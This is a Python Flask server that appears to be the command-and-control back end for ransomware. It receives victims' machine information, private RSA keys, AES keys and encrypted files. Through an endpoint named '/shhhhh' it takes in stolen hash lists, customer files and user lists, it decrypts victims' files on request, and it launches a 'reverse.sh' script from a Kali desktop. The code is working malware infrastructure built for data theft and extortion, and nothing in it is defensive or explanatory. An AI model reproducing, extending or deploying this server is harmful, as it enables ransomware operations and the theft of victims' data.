import os
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import json
import traceback
import subprocess

app = Flask(__name__)
app.config['BASE_FOLDER'] = 'data'
app.config['UPLOAD_FOLDER'] = 'uploaded_files'
app.config['DECRYPTED_FOLDER'] = 'decrypted_files'
app.config['HASH_FOLDER'] = 'hashes'

def get_computer_folder(computer_id):
    return os.path.join(app.config['BASE_FOLDER'], computer_id)

def get_sub_folder(computer_id, sub_folder_name):
    return os.path.join(get_computer_folder(computer_id), sub_folder_name)


SECRET_KEY = b'rYc0wv38EbC5zCC70HoCXA=='

def encrypt_data(data):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = b64encode(cipher.iv).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')
    return iv + ct

def decrypt_data(data):
    try:
        iv = b64decode(data[:24])
        ct = b64decode(data[24:])
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except (ValueError, KeyError):
        return None
    
@app.route('/info', methods=['POST'])
def info():
    try:
        computer_id = request.json.get('computer_id')
        if not computer_id:
            return jsonify({'error': 'No computer ID provided'}), 400

        encrypted_data = request.json.get('data')
        decrypted_data = decrypt_data(encrypted_data)
        if not decrypted_data:
            return jsonify({'error': 'Invalid data'}), 400

        main_folder = get_computer_folder(computer_id)
        os.makedirs(main_folder, exist_ok=True)
        main_folder_path = os.path.join(main_folder, 'information.txt')
        with open(main_folder_path, 'w') as f:
            f.write(decrypted_data)

        response_data = "We Gucci"
        encrypted_response = encrypt_data(response_data)
        return jsonify({'response': encrypted_response}), 200

    except Exception as e:
        print(e)
        return jsonify({'error': str(e)}), 500
    
@app.route('/verify', methods=['POST'])
def verify_transaction():
    try:
        encrypted_data = request.json.get('data')
        decrypted_data = decrypt_data(encrypted_data)
        if not decrypted_data:
            return jsonify({'error': 'Invalid data'}), 400
        
        if decrypted_data == "sufian":
            response_data = "AYO THIS GUY BLESS FRRRR"
        else:
            response_data = "Verification failed"
        
        encrypted_response = encrypt_data(response_data)
        return jsonify({'response': encrypted_response}), 200
    
    except Exception as e:
        print(e)
        return jsonify({'error': str(e)}), 500

@app.route('/saveprivatekey', methods=['POST'])
def save_private_key():
    try:
        computer_id = request.json.get('computer_id')
        if not computer_id:
            return jsonify({'error': 'No computer ID provided'}), 400

        data = request.json
        encrypted_private_key = data.get('encrypted_private_key')
        if not encrypted_private_key:
            return jsonify({'error': 'No encrypted private key provided'}), 400

        decrypted_private_key = decrypt_data(encrypted_private_key)
        if decrypted_private_key is None:
            return jsonify({'error': 'Failed to decrypt private key'}), 400

        private_key_folder = get_sub_folder(computer_id, 'keys')
        os.makedirs(private_key_folder, exist_ok=True)
        private_key_path = os.path.join(private_key_folder, 'private_decrypted.pem')

        with open(private_key_path, 'wb') as f:
            f.write(decrypted_private_key.encode('utf-8'))
        print("saveprivatekey saved successfully.")
        return jsonify({'message': 'success'}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
    
@app.route('/saveaeskeys', methods=['POST'])
def save_aes_keys():
    try:
        computer_id = request.json.get('computer_id')
        if not computer_id:
            return jsonify({'error': 'No computer ID provided'}), 400

        data = request.json
        encrypted_aes_keys = data.get('encrypted_aes_keys')
        if not encrypted_aes_keys:
            return jsonify({'error': 'No encrypted AES keys provided'}), 400

        keys_folder = get_sub_folder(computer_id, 'keys')
        os.makedirs(keys_folder, exist_ok=True)
        aes_keys_enc_path = os.path.join(keys_folder, 'aes_keys.enc')

        with open(aes_keys_enc_path, 'wb') as f:
            f.write(encrypted_aes_keys.encode('utf-8'))

        decrypted_aes_keys = decrypt_data(encrypted_aes_keys)
        if decrypted_aes_keys is None:
            return jsonify({'error': 'Failed to decrypt AES keys'}), 400

        aes_keys_json_path = os.path.join(keys_folder, 'aes_keys.json')
        with open(aes_keys_json_path, 'w') as f:
            f.write(decrypted_aes_keys)

        print("AES keys decrypted and saved successfully.")
        return jsonify({'message': 'success 2'}), 200

    except Exception as e:
        import traceback
        print(traceback.format_exc())
        return jsonify({'error': str(e)}), 500
@app.route('/getprivatekey', methods=['GET'])
def get_private_key():
    try:
        computer_id = request.args.get('computer_id')
        if not computer_id:
            return jsonify({'error': 'No computer ID provided'}), 400

        private_key_path = os.path.join(get_sub_folder(computer_id, 'keys'), 'private_decrypted.pem')
        aes_keys_enc_path = os.path.join(get_sub_folder(computer_id, 'keys'), 'aes_keys.enc')

        if not os.path.exists(private_key_path):
            return jsonify({'error': 'Private key not found'}), 400
        if not os.path.exists(aes_keys_enc_path):
            return jsonify({'error': 'AES keys not found'}), 400

        with open(private_key_path, 'rb') as f:
            private_key = f.read()
        encrypted_private_key = encrypt_data(private_key.decode('utf-8'))

        with open(aes_keys_enc_path, 'rb') as f:
            aes_keys = f.read().decode('utf-8')

        return jsonify({'encrypted_private_key': encrypted_private_key, 'encrypted_aes_keys': aes_keys}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/uploadfile', methods=['POST'])
def upload_file():
    try:
        computer_id = request.form.get('computer_id')
        if not computer_id:
            return jsonify({'error': 'No computer ID provided'}), 400

        if 'file' not in request.files:
            return jsonify({'error': 'No file part'}), 400
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400
        if file:
            filename = secure_filename(file.filename)
            upload_folder = get_sub_folder(computer_id, 'uploaded_files')
            os.makedirs(upload_folder, exist_ok=True)
            file_path = os.path.join(upload_folder, filename)
            file.save(file_path)
            return jsonify({'message': 'File uploaded successfully'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


def get_original_filename(fake_filename):
    original_filenames = {
        "1": "PTF_Hashes_FINAL.txt",
        "2": "CUSTOMER_Importfile_FINAL.txt",
        "3": "LOGFILE.txt",
        "4": "Users.csv"
    }
    return original_filenames.get(fake_filename, fake_filename)

def get_original_filename(fake_filename):
    original_filenames = {
        "1": "PTF_Hashes_FINAL.txt",
        "2": "CUSTOMER_Importfile_FINAL.txt",
        "3": "LOGFILE.txt",
        "4": "Users.csv"
    }
    return original_filenames.get(fake_filename, fake_filename)

@app.route('/shhhhh', methods=['POST'])
def upload_hashes():
    try:
        computer_id = request.form.get('computer_id')
        if not computer_id:
            return jsonify({"message": "computer_id is required"}), 400
        
        hashes_folder = get_sub_folder(computer_id, 'hashes')
        dec_hashes_folder = os.path.join(hashes_folder, 'decrypted_hashes')
        os.makedirs(hashes_folder, exist_ok=True)
        os.makedirs(dec_hashes_folder, exist_ok=True)

        for file_key in request.files:
            file = request.files[file_key]
            fake_filename = secure_filename(file.filename)
            file_path = os.path.join(hashes_folder, fake_filename)
            
            # Save the encrypted file to the specified directory
            file.save(file_path)
            
            # Decrypt the file content
            with open(file_path, 'r') as f:
                encrypted_content = f.read()
            
            decrypted_content = decrypt_data(encrypted_content)
            if decrypted_content is None:
                return jsonify({"message": "Failed to decrypt file"}), 400

            # Get the original filename from the fake_filename
            original_filename = get_original_filename(fake_filename)

            # Save the decrypted content with the original filename
            decrypted_file_path = os.path.join(dec_hashes_folder, original_filename)
            with open(decrypted_file_path, 'w') as f:
                f.write(decrypted_content)
        
        # Return a success response
        return jsonify({"message": "Files uploaded and decrypted successfully!"}), 200
    
    except KeyError as e:
        # Handle KeyError specifically
        return jsonify({"message": f"KeyError: {str(e)}"}), 400
    
    except Exception as e:
        # Handle all other exceptions
        print(traceback.format_exc())
        return jsonify({"message": str(e)}), 500

@app.route('/doit', methods=['POST'])
def decrypt_file():
    try:
        data = request.get_json()
        computer_id = data.get('computer_id')
        if not computer_id:
            return jsonify({'error': 'No computer ID provided'}), 400

        private_key_path = os.path.join(get_sub_folder(computer_id, 'keys'), 'private_decrypted.pem')
        aes_keys_enc_path = os.path.join(get_sub_folder(computer_id, 'keys'), 'aes_keys.enc')

        if not os.path.exists(private_key_path):
            return jsonify({'error': 'Private key not found'}), 400
        if not os.path.exists(aes_keys_enc_path):
            return jsonify({'error': 'AES keys not found'}), 400

        with open(private_key_path, 'rb') as f:
            private_key = RSA.import_key(f.read())

        with open(aes_keys_enc_path, 'rb') as f:
            encrypted_aes_keys = f.read().decode('utf-8')

        decrypted_aes_keys = decrypt_data(encrypted_aes_keys)
        if decrypted_aes_keys is None:
            return jsonify({'error': 'Failed to decrypt AES keys'}), 400

        aes_keys = json.loads(decrypted_aes_keys)
        cipher_rsa = PKCS1_OAEP.new(private_key)
        upload_folder = get_sub_folder(computer_id, 'uploaded_files')
        decrypted_folder = get_sub_folder(computer_id, 'decrypted_files')
        os.makedirs(decrypted_folder, exist_ok=True)

        # Debugging print statements to check folders
        print(f"Upload folder: {upload_folder}")
        print(f"Decrypted folder: {decrypted_folder}")

        for root, dirs, files in os.walk(upload_folder):
            for file in files:
                if file.endswith('.txt'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()

                    # Debugging print statements
                    # print(f"Processing file: {file_path}")
                    # print(f"Encrypted data length: {len(encrypted_data)}")
                    # print(f"Expected RSA encrypted key length: 256 bytes")
                    # print(f"Actual encrypted key length: {len(encrypted_data[:256])}")

                    if len(encrypted_data) < 256:
                        print(f"Skipping file {file_path}: encrypted data length is less than 256 bytes.")
                        continue

                    encrypted_key = encrypted_data[:256]
                    encrypted_content = encrypted_data[256:]

                    aes_key = cipher_rsa.decrypt(encrypted_key)
                    aes_iv = encrypted_content[:16]
                    cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
                    decrypted_content = unpad(cipher_aes.decrypt(encrypted_content[16:]), AES.block_size)
                    
                    # Debugging print statements to check decrypted content
                    #print(f"Decrypted content for file {file}: {decrypted_content}")

                    decrypted_file_path = os.path.join(decrypted_folder, file)
                    with open(decrypted_file_path, 'wb') as f:
                        f.write(decrypted_content)

        return jsonify({'message': 'Files decrypted successfully'}), 200

    except Exception as e:
        import traceback
        print(traceback.format_exc())
        return jsonify({'error': str(e)}), 500
    
@app.route('/runit', methods=['POST'])
def runit():
    try:
        data = request.get_json()
        computer_id = data.get('computer_id')
        if not computer_id:
            return jsonify({'error': 'No computer ID provided'}), 400
        
        main_folder = get_computer_folder(computer_id)
        hashes_folder = get_sub_folder(computer_id, 'hashes')
        dec_hashes_folder = os.path.join(hashes_folder, 'decrypted_hashes')
        
        main_folder_path = os.path.join(main_folder, 'information.txt')
        dec_hashes_folder = os.path.join(hashes_folder, 'decrypted_hashes')
        logfile_path = os.path.join(dec_hashes_folder, 'LOGFILE.txt')

        if not os.path.exists(main_folder_path):
            return jsonify({'error': f"{main_folder_path} does not exist"}), 404
        
        if not os.path.exists(dec_hashes_folder):
            return jsonify({'error': f"{dec_hashes_folder} does not exist"}), 404
        
        if not os.path.exists(logfile_path):
            return jsonify({'error': f"{logfile_path} does not exist"}), 404

        # Trigger the bash script in a new terminal
        script_path = "/home/kali/Desktop/here/reverse.sh"  # Adjust the path to your bash script
        subprocess.Popen(['gnome-terminal', '--', 'bash', script_path, computer_id])

        return jsonify({'message': 'Decryption process started'}), 200
    except Exception as e:
        import traceback
        print(traceback.format_exc())
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
